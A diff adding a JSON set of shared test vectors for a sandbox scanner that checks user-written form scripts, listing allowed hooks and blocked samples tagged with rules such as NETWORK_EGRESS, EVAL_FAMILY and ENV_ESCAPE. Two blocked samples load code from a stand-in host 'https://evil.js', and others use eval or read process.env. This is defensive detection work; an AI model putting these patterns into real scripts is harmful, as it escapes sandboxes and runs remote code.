@@ -1,0 +1,29 @@
+{
+  "formatVersion": 1,
+  "description": "红线扫描共享判定向量（08FE §8）：双端扫描器跑同一份样本，期望判定逐条一致——allowed=false 的样本必须携带 rule 标识。CI contract-diff 断言双端结果同判。",
+  "vectors": [
+    { "id": "ok-pure-calc", "source": "export function onFieldChange(fieldKey, value, ctx) { if (fieldKey === 'amount') { ctx.form.set('total', Number(value) * 2); } }", "allowed": true },
+    { "id": "ok-async-hook", "source": "export async function beforeSubmit(ctx) { const r = await ctx.api.call('unique-check', { key: 'code', value: ctx.form.get('code') }); return r.passed; }", "allowed": true },
+    { "id": "ok-sdk-import", "source": "import { fmt } from '@schema/script-sdk';\nexport function onLoad(ctx) { ctx.logger.info(fmt(ctx.page.params)); }", "allowed": true },
+    { "id": "ok-logger", "source": "export function afterSubmit(result, ctx) { ctx.logger.info('done', result.id); }", "allowed": true },
+    { "id": "ok-local-scope", "source": "const helper = (n) => n + 1;\nexport function onActionClick(actionKey, ctx) { return helper(actionKey.length); }", "allowed": true },
+    { "id": "bad-window", "source": "export function onLoad(ctx) { window.alert('hi'); }", "allowed": false, "rule": "GLOBAL_DOM" },
+    { "id": "bad-document", "source": "export function onLoad(ctx) { const el = document.querySelector('#x'); return !!el; }", "allowed": false, "rule": "GLOBAL_DOM" },
+    { "id": "bad-localStorage", "source": "export function onLoad(ctx) { localStorage.setItem('k', 'v'); }", "allowed": false, "rule": "WEB_STORAGE" },
+    { "id": "bad-sessionStorage", "source": "export function onLoad(ctx) { return sessionStorage.getItem('k'); }", "allowed": false, "rule": "WEB_STORAGE" },
+    { "id": "bad-fetch", "source": "export async function onLoad(ctx) { const r = await fetch('/api/data'); return r.ok; }", "allowed": false, "rule": "NETWORK_EGRESS" },
+    { "id": "bad-xhr", "source": "export function onLoad(ctx) { const x = new XMLHttpRequest(); x.open('GET', '/x'); return 1; }", "allowed": false, "rule": "NETWORK_EGRESS" },
+    { "id": "bad-websocket", "source": "export function onLoad(ctx) { const ws = new WebSocket('wss://x'); return 2; }", "allowed": false, "rule": "NETWORK_EGRESS" },
+    { "id": "bad-globalThis", "source": "export function onLoad(ctx) { globalThis.eval('1+1'); }", "allowed": false, "rule": "ENV_ESCAPE" },
+    { "id": "bad-process", "source": "export function onLoad(ctx) { return process.env.HOME; }", "allowed": false, "rule": "ENV_ESCAPE" },
+    { "id": "bad-require", "source": "export function onLoad(ctx) { const p = require('path'); return 1; }", "allowed": false, "rule": "ENV_ESCAPE" },
+    { "id": "bad-eval", "source": "export function onLoad(ctx) { return eval('2+2'); }", "allowed": false, "rule": "EVAL_FAMILY" },
+    { "id": "bad-function-ctor", "source": "export function onLoad(ctx) { return new Function('return 1')(); }", "allowed": false, "rule": "EVAL_FAMILY" },
+    { "id": "bad-importScripts", "source": "export function onLoad(ctx) { importScripts('https://evil.js'); }", "allowed": false, "rule": "ENV_ESCAPE" },
+    { "id": "bad-dynamic-import", "source": "export async function onLoad(ctx) { const m = await import('https://evil.js'); return 1; }", "allowed": false, "rule": "DYNAMIC_IMPORT" },
+    { "id": "bad-with", "source": "export function onLoad(ctx) { with (ctx) { return 1; } }", "allowed": false, "rule": "WITH_STMT" },
+    { "id": "bad-global-assignment", "source": "export function onLoad(ctx) { leaked = 42; return leaked; }", "allowed": false, "rule": "GLOBAL_ASSIGNMENT" },
+    { "id": "bad-import-not-whitelisted", "source": "import axios from 'axios';\nexport function onLoad(ctx) { return 1; }", "allowed": false, "rule": "IMPORT_WHITELIST" },
+    { "id": "bad-import-nested-path", "source": "import { x } from '@schema/script-sdk/../escape';\nexport function onLoad(ctx) { return x; }", "allowed": false, "rule": "IMPORT_WHITELIST" }
+  ]
+}
